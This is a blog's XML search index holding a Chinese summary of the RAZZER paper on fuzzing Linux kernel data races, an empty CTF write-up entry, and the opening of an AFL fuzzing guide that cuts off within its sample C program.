<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Google Capture The Flag 2019 (Quals) WP</title>
      <link href="/2019/07/18/Google-Capture-The-Flag-2019/"/>
      <url>/2019/07/18/Google-Capture-The-Flag-2019/</url>
      <content type="html"><![CDATA[<p>del</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Razzer-Finding Kernel Race Bugs through Fuzzing</title>
      <link href="/2019/06/30/Razzer-Finding-Kernel-Race-Bugs-through-Fuzzing/"/>
      <url>/2019/06/30/Razzer-Finding-Kernel-Race-Bugs-through-Fuzzing/</url>
      <content type="html"><![CDATA[<p>出处：S&amp;P 2019 </p><p>作者：Dae R. Jeong, Kyungtae Kim, Basavesh Shivakumar, Byoungyoung Lee, Insik Shin </p><p>单位：Computer Science, KAIST, Computer Science, Purdue University, Electrical and Computer Engineering, Seoul National University </p><p>资料：<a href="https://github.com/fengjixuchui/FuzzingPaper/blob/master/Paper/SP19_Razzer.pdf" target="_blank" rel="external">Paper</a> </p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>内核中的数据竞争是一类严重的bug，会影响相关系统的可靠性和安全性。利用内核中的竞争，简单的可以是内核变得没有响应， 严重的则会触发权限提升攻击以获取root权限。</p><p>本文将主要基于RAZZER，一种在内核中查找竞争漏洞的工具，来介绍对内核数据竞争漏洞的模糊测试。一般的模糊测试是通过输入畸形数据来触发目标程序的崩溃进而再通过手动分析确定是否存在安全问题的，但是这种方式不仅很难对竞争漏洞进行针对性测试，而且很难发现由于竞争漏洞而导致的潜在安全问题。与传统方案的不同，RAZZER的核心思想是引导Fuzzing工具去执行可能存在数据竞争漏洞的代码。具体来说就是采用静态分析和确定性线程交错技术。静态分析技术来对潜在的内核数据竞争点进行定位，从而引导Fuzz器更有效地对内核中的数据竞争点进行Fuzz。确定性线程交错技术则是用来控制线程调度，以提供精确的并行执行信息，降低不确定性，从而保证内核竞争的稳定触发。但是此项工作并没有解决同步机制对多线程模糊测试的影响。</p><h2 id="I-介绍"><a href="#I-介绍" class="headerlink" title="I 介绍"></a>I 介绍</h2><p>数据竞争对底层系统的可靠性和安全性会造成影响，具体来说主要是以下三个方面：</p><ol><li>如果数据竞争引入了循环锁定行为，则由于导致的死锁，造成内核无响应。</li><li>如果出现在内核中的安全断言，内核将自行重启，从而导致拒绝服务。</li><li>数据竞争还可能会导致严重的安全攻击，比如触发缓冲区溢出或者UAF等类型的漏洞进而导致权限提升攻击。例如CVE-2016-8655 [1]，CVE-2017-2636 [2]和CVE-2017-17712 [3]。</li></ol><p>因为数据竞争源于内核的非确定性行为，所以研究数据竞争不仅需要精确的控制流和数据流信息，还需要精确的并发执行信息，这些信息受到底层系统的许多其他外部因素（例如调度，同步原语等）的严重影响。</p><p>本文介绍的RAZZER首先进行使用LLVM传递实现了静态分析以获得潜在数据竞争点，之后针对这些竞争点执行两次动态模糊测试。第一次是单线程模糊测试，其重点是找到执行潜在竞争点的单线程输入程序（不考虑程序是否确实触发了竞争）。第二次是多线程模糊测试，使用自建的多线程程序，进一步利用修改QEMU和KVM开发的管理程序来促使其在潜在数据竞争点的执行。因此，RAZZER能够避免外部因素的影响使竞争行为稳定触发。</p><p>RAZZER的主要特点如下：</p><ol><li>面向竞争的Fuzzer：这是一种新的模糊测试机制，专门用于检测内核中的竞争。 它利用静态和动态分析技术将其模糊测试集中在潜在的竞争点上。</li><li>强大的实现：基于各种行业优势框架实施了RAZZER，主要是KVM / QEMU和LLVM。 它不需要手动修改要分析的目标内核，从而可以轻松支持最新的Linux内核而无需任何人工干预。</li><li>实际效果：RAZZER发现了30个竞争漏洞，其中16个已经被确认，并由相应的内核开发人员进行相应的修复。 </li></ol><h2 id="II-问题定义-amp-设计需求"><a href="#II-问题定义-amp-设计需求" class="headerlink" title="II 问题定义&amp;设计需求"></a>II 问题定义&amp;设计需求</h2><h3 id="A-问题定义"><a href="#A-问题定义" class="headerlink" title="A.问题定义"></a>A.问题定义</h3><p>当目标程序中的两个存储器访问指令满足以下三个条件时，发生数据竞争：<br>（i）访问的内存地址相同。<br>（ii）至少其中一条指令是对内存的写。<br>（iii）两条指令可以并发执行。<br>数据竞争并不都会触发漏洞，有些是开发人员预期的（或有意的）数据竞争，容忍计算结果的潜在偏差。只有那些会触发非预期行为的数据竞争才会触发漏洞。此处引入如下四个术语来进行标识：<br>RacePaircand 可能导致竞争的两个内存访问指令<br>RacePairtrue 两个被确认引起竞争的指令<br>RacePairbenign 预期的数据竞争<br>RacePairharm 会触发漏洞的非预期数据竞争</p><p>此处以竞争漏洞CVE-2017-2636作为示例来阐述数据竞争是如何发生的并且发生之后将会触发什么危害。此漏洞的详情如图1所示，造成漏洞的原因是本应是一个特定顺序的系统调用的特定列表，但却因为一个对抗的多线程用户程序引发了数据竞争，最终在内核处理此类系统调用，比如ioctl和write时导致了double-free问题。</p><p><img src="https://i.loli.net/2019/06/30/5d18b5a88ce6d62057.png" alt="8CEEBBC7-64F3-4B76-ACDB-C930AC6C60FB.png"></p><p>图1：关于CVE-2017-2636的简化竞争示例。 当用户程序同时执行两个系统调用时，n_hdlc-&gt; tbuf上的数据竞争可能会发生，但具体要取决于执行顺序，这会情况会导致double-free问题，从而允许攻击者启动权限提升攻击。</p><h3 id="B-设计需求"><a href="#B-设计需求" class="headerlink" title="B.设计需求"></a>B.设计需求</h3><p><strong>设计要求</strong> 为了避免检测竞争过程中出现任何误报，确定出以下两个理想的设计要求：</p><p>R1：找到执行RacePaircand的输入程序。 更确切地说，分析应该发现一个多线程用户程序，程序中的每个线程执行RacePaircand中的每个指令。<br>R2：找到同时执行RacePaircand的输入程序的线程交错。</p><p>之所以要满足这两个设计要求是因为单独的R1不能确保可以同时执行RacePaircand以触发数据竞争，因此分析应该识别同时执行RacePaircand的特定线程交错情况。</p><p><strong>需求研究–传统的模糊测试</strong> 传统的模糊测试专注于对R1的解决，试图找到扩展内核代码覆盖范围的输入。由于根本不考虑R2，因此发现数据竞争基本都是无效的。</p><p><strong>需求研究–线程交叉工具</strong> 关于随机线程交错工具（例如SKI [4]或PCT算法[5]），他们的重点是满足R2，试图探索特定（和静态）输入程序的所有可能的线程交错情况。由于他们不考虑R1，因此他们只能运行现有程序（例如基准测试），因此无法有效地探索大量代码空间，导致大部分内核未经测试。此外，因为线程交错工具基于随机调度，所以它们单独对R2的效率（即简单地搜索所有线程交错情况）也受到严重限制。</p><h2 id="III-设计-amp-实现"><a href="#III-设计-amp-实现" class="headerlink" title="III. 设计&amp;实现"></a>III. 设计&amp;实现</h2><p>RAZZER背后的关键理念是采用动静混合测试方案来对内核中潜在数据竞争点的分析。首先，RAZZER执行静态分析以获得十分近似的潜在数据竞争点。之后，RAZZER进行两阶段动态分析。第一阶段是单线程模糊测试，其重点是识别执行潜在竞争点（尝试满足R1）的单线程输入程序。第二阶段是多线程模糊测试。第二阶段在第一阶段的帮助下构建多线程程序，利用自定义管理程序确定性地控制线程交错（尝试满足R2）。找到竞争之后，RAZZER就会输出一个具体的用户程序（即触发数据竞争的程序）。Razzer还会检测内核是否出现了错误，如果RacePairtrue在程序后续执行过程中，导致了内核错误，则得到了一个RacePairharm。</p><p><img src="https://i.loli.net/2019/06/30/5d18b5cea1ddc33409.png" alt="CE56457C-84BA-4FD7-B52C-7F73DB09332B.png"></p><p>图2：RAZZER的整体架构</p><h3 id="A-静态分析识别潜在竞争点"><a href="#A-静态分析识别潜在竞争点" class="headerlink" title="A. 静态分析识别潜在竞争点"></a>A. 静态分析识别潜在竞争点</h3><p>静态分析的目标是识别内核中的所有RacePaircand，其中每个RacePaircand由两个内存访问指令组成，并且可能需要在运行时竞争。RAZZER在此处使用的是点对分析，但是一般而言点对分析在准确性和性能方面受到限制，并且会具有很高的误报率，因此RAZZER在此采用特有的方式对这个问题来进行解决。</p><p>首先是为了解决准确性问题，RAZZER允许点分析十分逼近RacePaircand集（即，某些RacePaircand可能不是RacePairtrue），并通过其动态模糊测试解决误报问题。其次，为了缓解性能问题，RAZZER执行内核的定制分区分析。 它根据模块组件对内核对象进行分区，并对每个模块执行预分析。 并且在对每个模块执行预分析时，RAZZER也始终提供核心内核模块。</p><p>值得注意的一点是，此处的静态分析不考虑内核中的同步原语（例如，read_lock()，br_read_lock()，spin_lock_irqsave()，up()）。利用这些信息可以降低误报率（因为它可以帮助确定不能竞争的内存对）。</p><h3 id="B-Hypervisor中的每核心调度程序"><a href="#B-Hypervisor中的每核心调度程序" class="headerlink" title="B. Hypervisor中的每核心调度程序"></a>B. Hypervisor中的每核心调度程序</h3><p>由于内核线程交错的非确定性和随机性，竞争条件很少表现出来。因此，RAZZER在定制的虚拟化环境中运行目标内核，以便RAZZER避免来自外部事件的非确定性行为。具体来说就是 RAZZER修改虚拟机管理程序为guest内核提供了以下功能：</p><ol><li>为每个CPU核心设置一个断点:RAZZER提供了一个新的超级调用接口hcall_set_bp()，以便guest内核可以根据需要设置每个核心的断点。这个超级调用接口会在虚拟机guest内核使用两个参数时如下来个参数时被调用。<br>(1) vCPU_ID指定RAZZER应在其上安装断点的虚拟CPU（vCPU）;<br>(2) guest_addr指定客户操作系统的地址空间中要安装断点的地址。<br>收到此超级调用后，虚拟机管理程序会在guest_addr上安装硬件断点，该断点仅对指定的vCPU有效。</li><li>在guest内核遇到断点后恢复执行内核线程:在两个客户内核线程停在它们各自的断点地址（即RacePaircand）之后，RAZZER恢复两个vCPU的执行，使得两个线程同时执行RacePaircand。 RAZZER在这里做出的一个重要决定是：应该首先恢复哪个内核线程？这对于识别数据竞争非常重要，因为某些竞争bug仅在特定执行任务上展示。恢复的工作流程如图3所示。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b5e89fc7f54203.png" alt="5E705F2C-2A22-49B7-84DA-E6F804C3895A.png"></p><p>图3：RAZZER管理程序的工作流程</p><ol><li>检查guest内核是否确实发生了竞争:当两个断点同时被触发时，我们的管理程序检查给定的RacePaircand是否实际导致竞争。 更具体地说，当RacePaircand中的两个存储器指令都命中断点时，我们的管理程序会对这些指令要访问的目标地址进行分析。 如果这些地址相同，那么RAZZER会得出结论，给定的RacePaircand真正参加竞争，将这样的一对推广到RacePairtrue。 从技术上讲，我们的虚拟机管理程序通过反汇编每个RacePaircand位置的指令并获得存储在每个vCPU中的具体寄存器值来计算目标地址值。</li></ol><h3 id="C-通过两个阶段的Fuzz来发现竞争漏洞"><a href="#C-通过两个阶段的Fuzz来发现竞争漏洞" class="headerlink" title="C. 通过两个阶段的Fuzz来发现竞争漏洞"></a>C. 通过两个阶段的Fuzz来发现竞争漏洞</h3><p>RAZZER的模糊测试分两个阶段进行：<br>（i）单线程模糊测试阶段找到一个触发任何RacePaircand的单线程用户程序;<br>（ii）多线程模糊测试阶段最终找到一个多线程用户程序，该程序根据单线程阶段的结果触发一次攻击竞争。<br>要注意每个模糊测试阶段由两个组件组成，即生成器和执行器，其中生成器创建用户程序，然后执行程序运行程序。</p><p>1）单线程模糊测试：在这个阶段，单线程生成器最初生成Pst，一个带有一系列随机系统调用的单线程程序。 接下来，单线程执行程序运行每个Pst，同时测试Pst的每次执行是否会覆盖RacePaircand。如果覆盖，则单线程执行程序将Pst（带有被覆盖RacePaircand的信息注释）传递给下一阶段来进行多线程模糊测试。</p><p><strong>单线程生成器</strong> 单线程生成器构造一个单线程用户程序（我们称之为Pst），执行一系列随机系统调用来测试内核的行为。 RAZZER使用以下两种策略构建Pst：生成和变异。 使用生成策略时，RAZZER会根据预定义的系统调用语法随机生成Pst。 此系统调用语法包括所有可用的系统调用以及每个系统调用的一系列合理参数值。 遵循此语法，RAZZER尝试通过随机选择一系列系统调用来构建合理的用户程序。 然后它随机填充每个系统调用的参数，并将其返回值随机地捎带到跟随系统调用的参数上。与生成相反，突变随机改变现有的Pst。 它可能会随机丢弃Pst中的一些系统调用，插入新的系统调用或更改某些参数值。</p><p><strong>单线程执行程序</strong> 给定来自生成器的Pst，单线程执行器在执行以下两个任务时运行每个Pst。 首先，如果Pst的执行覆盖任何RacePaircand中的两个存储器访问指令，则RAZZER将这样匹配的RacePaircand信息注释到Pst。 然后RAZZER将这个带注释的Pst传递给多线程生成器，以便可以进一步检查它是否正在竞争。</p><p>2）多线程模糊测试：在单线程模糊测试阶段后，RAZZER进入多线程模糊测试阶段。 对于每个RacePaircand，多线程生成器将Pst转换为Pmt，Pst的多线程版本。 Pmt还配备了管理程序调用，以在给定的RacePaircand上确定性地触发竞争。 最后，多线程执行程序运行每个Pmt。 如果Pmt被确认为由管理程序触发竞争，则RAZZER将相应的RacePaircand提升为RacePairtrue，并通过将其反馈给生成器来继续改变Pmt。 此外，如果Pmt能够触发内核崩溃，RAZZER则会生成一份有关已识别的有害竞争的详细报告。</p><p><strong>多线程生成器</strong> 多线程生成器使用带注释的Pst（包括RacePaircand）作为输入。 然后输出Pmt，也就是Pst的多线程版本，同时输入带注释的RacePaircand信息利用超级调用确定性地触发竞争。由Pst转换为Pmt的程序如图4所示</p><p><img src="https://i.loli.net/2019/06/30/5d18b602c5d8827167.png" alt="4D28506F-9E98-4E29-9524-FA4A34DC6591.png"></p><p>图5：RAZZER的多线程生成器算法</p><p>当Pmt中的RacePaircand指令都触发断点时，Razzer会检查访存指令的访问地址是否相同，如果相同，则判定为RacePairtrue。可以注意到在Pmt的最后加入了一些随机的syscall，这是为了当数据竞争造成了具有攻击效果的后果时，让程序报错。每当检测到一个RacePairtrue，就会把结果反馈回生成算法，并保持前面的代码不变，只修改后续随机添加的syscall，进行新的Fuzz。如果其中某个Pmt使kernel报错，则认为是发现了一个RacePairharm。</p><p><strong>多线程执行程序</strong> 多线程执行程序的主要作用是运行Pmt以测试RacePaircand是否真正触发了竞争。 在运行时，它会在调用相应的racy系统调用之前，利用超级调用在RacePaircand指令中设置每核断点。 然后，hcall_check_race()通过同时检查以下两个条件来确定是否真正触发了竞争：<br>（1）如果管理程序确实捕获了两个断点；<br>（2）RacePaircand指令访问的具体内存地址是相同的。</p><p>要注意引起真正的竞争本身并不一定意味着有害的竞争，RAZZER会在竞争后触发系统调用，以便从各种竞争中辨别出有害的竞争。 大多数现代内核使用运行时竞争检测机制来检查是否发生了有害竞争。 例如，Linux内核使用各种动态技术来检测有害的竞争。 示例是lockdep[6]，KASAN [7]或由内核开发人员手动插入的断言。 我们在构建内核二进制文件时启用了所有这些技术，以便RAZZER可以利用这种增强的竞争检测功能。</p><p>RAZZER的一个重要特征是它向Pmt上的多线程生成器提供反馈，导致真正的竞争（即使是良性竞争），这样Pmt可以进一步变异，但仅限于与竞争后行为相关的部分。</p><h3 id="D-实现"><a href="#D-实现" class="headerlink" title="D. 实现"></a>D. 实现</h3><ol><li>RAZZER的静态分析基于LLVM 4.0.0和SVF[8]。</li><li>RAZZER的虚拟机管理程序在QEMU 2.5.0上实现，并利用KVM（基于内核的虚拟机）来利用硬件加速。</li><li>RAZZER的模糊器是基于Syzkaller[9]实现的。</li></ol><h2 id="IV-评估"><a href="#IV-评估" class="headerlink" title="IV. 评估"></a>IV. 评估</h2><p>在评估之前首先要准备好目标内核，RAZZER不需要手动修改要分析的目标内核，它只需要先使用LLVM和GCC对目标进行build，之后运行在RAZZER的hypervisor虚拟机上即可。</p><ol><li>图5总结了RAZZER确定的竞争漏洞。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b61b13acd91907.png" alt="60EEAB57-10C6-45BB-BCCA-7A14B2528780.png"></p><p>图5：RAZZER新发现可以造成安全缺陷的竞争漏洞清单</p><ol><li>图6展示了RAZZER发现新的有害竞争的效率。在这个图中，主要描绘了两类bug：（i）通过单线程模糊测试发现的非竞争bug; （ii）通过多线程模糊测试发现的竞争bug。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b62f4991954310.png" alt="80335BF3-5851-4D38-A49C-751272C623E7.png"></p><p>图7：随时间变化的唯一崩溃次数</p><ol><li>为了证明RAZZER分区分析的有效性，作者测量了从整个内核获取所有RacePairscand所需的时间，如图8所示。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b6444f5a458116.png" alt="8D7C37A3-6D05-4F8A-A2F5-CAEC90794E3A.png"></p><p>图8：RAZZER静态分析的性能</p><ol><li>鉴于RAZZER利用超级调用来启用vCPU的确定性行为，因此需要额外的开销来与管理程序进行通信。为了了解由于管理程序引起的开销，测量了每次超级调用的经过时间100M次并计算了平均值。图9显示了RAZZER的超级调用的性能开销。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b6566afad24683.png" alt="BC14696C-9949-4936-BB5B-E5C7487E06C2.png"></p><p>图9：执行RAZZER的超级调用时的性能开销</p><ol><li>模糊测试的执行吞吐量可能是模糊技术效率的间接测量，但更直接和重要的测量应该是找到bug所需的时间（即本文中的有害竞争）。 为了证明这一点，我们测量了发现以前已知的有害竞争CVE-2017-2636，CVE-2016-8655和CVE2017-17712所需的执行次数，同时运行了10个小时。如图10所示，RAZZER发现所有这些以前已知的竞争具有合理的执行次数（即从246 K到1,170 K）以及在合理的时间内（即从7分钟到26分钟）。 然而，Syzkaller未能找到所有这些案例，尽管在10小时内从5 M到37 M生成/突变程序执行。 特别是基于这些CVE案例，表明RAZZER比Syzkaller更快，至少为23至85倍。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b66b3b52350327.png" alt="21F6932C-A538-4609-B7E9-C3977510B3B7.png"></p><p>图10：Syzkaller和RAZZER在查找触发竞争的用户程序时的效率。 作者测量了执行总次数和找到之前已知竞争所需的时间。 RAZZER在合理的时间内找到了所有已知的竞争，而Syzkaller在10小时的给定时间内没有发现任何竞争（v4.8）。</p><ol><li>图11显示了在运行RAZZER和SKIEmu时触发每个竞争所需的执行次数。 由于RAZZER仅探索与RacePairscand相关的线程交错（通过运行给定的用户程序发现），因此探索的线程交错情况要少得多，RAZZER所需的执行次数远少于SKIEmu，范围从30次减少到398次。 这个结果还表明，SKIEmu探索的许多线程交错案例与竞争无关，这标志着RAZZER在满足R2方面的有效性。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b67e85ebe59307.png" alt="90A08220-0F1A-4C50-81A8-5B4F79A34399.png"></p><p>图11：SKIEmu和RAZZER在揭示触发竞争的线程交错方面的效率。 Found列显示了查找交错所需的执行次数（通过重复实验5次并计算平均值获得），Total列显示每个工具所需的理论最大执行次数（v4.8）。</p><h2 id="V-相关工作"><a href="#V-相关工作" class="headerlink" title="V. 相关工作"></a>V. 相关工作</h2><p>面向内核的Fuzzing测试的主要思想是通过给内核驱动输入大量畸形数据，观察操作系统对这些畸形数据处理后的反应，如果出现了蓝屏或者崩溃等信息，则再对dump信息进行静态分析定位漏洞[10]。这类工具如IOCTL、Syzkaller等。此节将主要介绍那些能够识别（或协助识别）数据竞争的技术。</p><p><strong>动态模糊测试</strong> 最近的许多研究表明，模糊测试是一种很有前途的技术，用于发现用户程序中[11]和内核[12]的bug。 模糊测试的关键优势不仅在于该方法可以有效地发现目标程序中的bug，而且还可以避免误报，因为它会产生再现bug的输入。 然而，据我们所知，所有模糊测试技术在用于识别竞争bug时效率低下，主要是因为他们的设计不适合竞争。 虽然大多数模糊器专注于利用先前探索的执行覆盖，但他们不考虑线程交错。 与这些相比，本文介绍的RAZZER则综合考虑了执行覆盖和线程交错从而更有效地发现数据竞争。</p><p><strong>动态线程调度程序</strong> 一些研究例如试图通过实现随机化每线程执行调度的定制线程调度器来找到引起竞争的线程交错的实例。 特别是，PCT算法[13]和SKI [4]通过探索所有可能的线程交错情况来发现用户程序或内核中的竞争。 这两种方法的局限性是：（i）他们不生成（或改变）输入程序，因此它找不到触发数据竞争的新程序; （ii）它们无法找到同时执行RacePaircand的输入程序的线程交错，因为它们必须搜索所有可能的线程交错情况的非常大的空间。 事实上，RAZZER的设计灵感来自PCT算法和SKI它通过定制模糊过程来满足R1，同时通过对RacePairscand进行优先搜索来有效地满足R2。</p><p><strong>动态竞争检测器</strong> 许多研究[14]试图通过收集关于竞争的丰富的上下文信息来改善运行时的竞争检测能力。 这些基本上与RAZZER正交，也就是说它们与RAZZER一起部署后，RAZZER的竞争检测能力也可以得到增强。</p><p>特别是，ThreadSanitizer [15]是由谷歌开发的企业级竞争检测器，最近也应用在了Linux内核发布之前的检测。 为了在检测竞争时增强性能，TxRace [16]利用硬件事务存储器，ProRace [17]利用性能监控单元。 存储器采样技术有选择地监视存储器访问以优化性能。 RaceMob [18]从静态分析生成的潜在数据竞争中众包运行时竞争测试。 Snorlax [19]建议使用粗略交错假设来利用粗粒度定时信息来确定事件的线程交错。</p><p><strong>静态分析</strong> 静态分析已被广泛用于发现未知的bug。在此类别中，我们将重点讨论与竞争bug检测或点对分析实施相关的静态分析工作。 Relay [20]是一个静态的竞争检测器，适用于内核等大型程序。 Relay通过执行基于锁定的自下而上分析生成RacePairscand，同时总结每个函数的行为。 RacerX [21]也可用于查找大型复杂多线程系统的竞争条件和死锁。由于单独使用静态分析技术的局限性，这些基本上导致高的误报率（例如，Relay在Linux内核上显示出84％的误报率），严重限制了它们在实践中的使用。然而，RAZZER还利用动态分析技术，解决了高误报率的可能性。在点对分析实施方面，最近提出了K-miner [22]，通过程序间和上下文敏感性分析揭示商品操作系统中的内存损坏漏洞。 RAZZER的静态分析是基于K-miner的实现而构建的，但经过修改以通过点分析来识别RacePairscand。</p><h2 id="VI-讨论"><a href="#VI-讨论" class="headerlink" title="VI.讨论"></a>VI.讨论</h2><p><strong>静态分析中的漏报</strong>  由于RAZZER依赖于静态分析的结果，如果RacePaircand中缺少任何真正的竞争对，则会导致RAZZER对bug的漏报。 静态分析的这种丢失情况可能主要是因为分区分析发生的。 因为RAZZER的分区分析基于跨越不同内核模块的竞争很少发生（例如，文件系统和终端设备驱动程序）这个假设。 因此，如果假设的情况发生了，RAZZER的RacePaircand将不会包含这样的竞争对，从而导致漏报。要解决这个问题，可以去除RAZZER的分区分析，采用更精确的静态分析技术。</p><p><strong>将RAZZER应用于其他系统</strong>  RAZZER是一种灰盒模糊测试，所以只要源代码和对应的虚拟环境的支持，将RAZZER应用于其他现代操作系统（如Windows，MacOSX，FreeBSD，以及一些开源内核）是很容易的。 从介绍以及开源的代码上来看RAZZER只是在处理系统调用调用模型的时候是针对Linux的，其余所有设计都是平台无关的，因为其核心机制可以离线（即静态分析）或透明（即定制执行系统管理程序）。</p><p><strong>变异策略</strong>  如果将RAZZER测试内核竞争漏洞的思想应用于用户程序，可能不需要在识别竞争后再使用其他变异策略。 因为与偶尔允许使用竞争提高性能的Linux内核不同，大多数用户程序中都会存在数据竞争这样的bug。</p><h2 id="VII-结论"><a href="#VII-结论" class="headerlink" title="VII.结论"></a>VII.结论</h2><p>本文基于RAZZER这种结合静态分析和动态模糊测试的方案，来对内核竞争漏洞的模糊测试技术做了介绍。RAZZER是一款为竞争漏洞量身定制的模糊测试工具，不仅其实现方案极具代表性，其实的实际效果也非常的好。 它利用静态分析来发现潜在的数据竞争点，以指导模糊器识别竞争。 此外，它修改底层管理程序以确定性地触发竞争。 对RAZZER的评估证明了其强大的检测竞争的能力。 它已经在Linux内核中发现了30个新的竞争，并且与其他最先进的工具（特别是Syzkaller和SKI）进行了比较研究，证明了它在检测内核中的竞争漏洞方面的出色表现。</p><h2 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h2><p>[1] MITRE. CVE-2016-8655., 2016. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655</a>.</p><p>[2] MITRE. CVE-2017-2636., 2017. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636</a>.</p><p>[3] MITRE. CVE-2017-17712., 2017. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17712" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17712</a>.</p><p>[4] Fonseca P , Rodrigues R , Björn B. Brandenburg. SKI: exposing kernel concurrency bugs through systematic schedule exploration[C]// Usenix Conference on Operating Systems Design &amp; Implementation. USENIX Association, 2014.</p><p>[5] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167.</p><p>[6] I. Molnar. Runtime locking correctness validator, 2018. <a href="https://www.kernel.org/doc/Documentation/locking/lockdep-design.txt" target="_blank" rel="external">https://www.kernel.org/doc/Documentation/locking/lockdep-design.txt</a>.</p><p>[7] Kernel address sanitizer, 2018. <a href="https://github.com/google/kasan/wiki" target="_blank" rel="external">https://github.com/google/kasan/wiki</a>.</p><p>[8] Sui Y , Xue J . [ACM Press the 25th International Conference - Barcelona, Spain (2016.03.17-2016.03.18)] Proceedings of the 25th International Conference on Compiler Construction - CC 2016 - SVF: interprocedural static value-flow analysis in LLVM[J]. 2016:265-266.</p><p>[9] D. Vyukov. Syzkaller, 2015. <a href="https://github.com/google/syzkaller" target="_blank" rel="external">https://github.com/google/syzkaller</a>.</p><p>[10] 史记, 曾昭龙, 杨从保, et al. Fuzzing 测试技术综述[J]. 信息网络安全, 2014(3):87-91.</p><p>[11] Pham V T , Roychoudhury A . Coverage-based Greybox Fuzzing as Markov Chain[C]// Acm Sigsac Conference on Computer &amp; Communications Security. ACM, 2016.</p><p>[12] You W , Zong P , Chen K , et al. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits[C]// Acm Sigsac Conference. ACM, 2017.</p><p>[13] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167.</p><p>[14] Veeraraghavan K , Chen P M , Flinn J , et al. Detecting and Surviving Data Races using Complementary Schedules[C]// Proceedings of the 23rd ACM Symposium on Operating Systems Principles 2011, SOSP 2011, Cascais, Portugal, October 23-26, 2011. ACM, 2011.</p><p>[15] Serebryany K , Iskhodzhanov T . ThreadSanitizer: data race detection in practice[C]// Workshop on Binary Instrumentation &amp; Applications. ACM, 2009.</p><p>[16] Zhang T , Lee D , Jung C . TxRace: Efficient Data Race Detection Using Commodity Hardware Transactional Memory[J]. Acm Sigplan Notices, 2016, 50(2):159-173.</p><p>[17] Zhang T , Jung C , Lee D . ProRace: Practical Data Race Detection for Production Use[J]. Acm Sigarch Computer Architecture News, 2017, 45(1):149-162.</p><p>[18] Kasikci B , Zamfir C , Candea G . RaceMob: Crowdsourced data race detection[C]// Proceedings of the Twenty-Fourth ACM Symposium on Operating Systems Principles. ACM, 2013.</p><p>[19] Kasikci B , Cui W , Ge X , et al. [ACM Press the 26th Symposium - Shanghai, China (2017.10.28-2017.10.28)] Proceedings of the 26th Symposium on Operating Systems Principles, - SOSP \”17 - Lazy Diagnosis of In-Production Concurrency Bugs[J]. 2017:582-598.</p><p>[20] Voung J W , Jhala R , Lerner S . RELAY: static race detection on millions of lines of code[C]// Proceedings of the 6th joint meeting of the European Software Engineering Conference and the ACM SIGSOFT International Symposium on Foundations of Software Engineering, 2007, Dubrovnik, Croatia, September 3-7, 2007. ACM, 2007.</p><p>[21] Engler D . RacerX : Effective, static detection of race conditions and deadlocks[C]// Proc. ACM Symposium Operating Systems Principles, 2003. ACM, 2003.</p><p>[22] D. Gens, S. Schmitt, L. Davi, and A.-R. Sadeghi. K-miner: Uncovering memory corruption in linux. In Proceedings of the 2018 Annual Network and Distributed System Security Symposium (NDSS), San Diego, CA, Feb. 2018.</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>AFL使用指南</title>
      <link href="/2019/05/15/how-to-use-afl-fuzz/"/>
      <url>/2019/05/15/how-to-use-afl-fuzz/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>二进制分析方面主要利用技术包括：动态分析(Dynamic Analysis)、静态分析(Static Analysis)、符号化执行(Symbolic Execution)、Constraint Solving、资讯流追踪技术(Data Flow Tracking)以及自动化测试(Fuzz Testing)</p><p>AFL原理介绍参考：<br><a href="https://www.freebuf.com/articles/system/191536.html" target="_blank" rel="external">《AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing》</a></p><p>本指南使用的环境是 kali linux 2019.1</p><h2 id="0x01-AFL的基本使用"><a href="#0x01-AFL的基本使用" class="headerlink" title="0x01 AFL的基本使用"></a>0x01 AFL的基本使用</h2><h3 id="1-使用afl-gcc"><a href="#1-使用afl-gcc" class="headerlink" title="1. 使用afl-gcc"></a>1. 使用afl-gcc</h3><h4 id="1-1-使用AFL插桩程序"><a href="#1-1-使用AFL插桩程序" class="headerlink" title="1.1 使用AFL插桩程序"></a>1.1 使用AFL插桩程序</h4><p>目标程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> 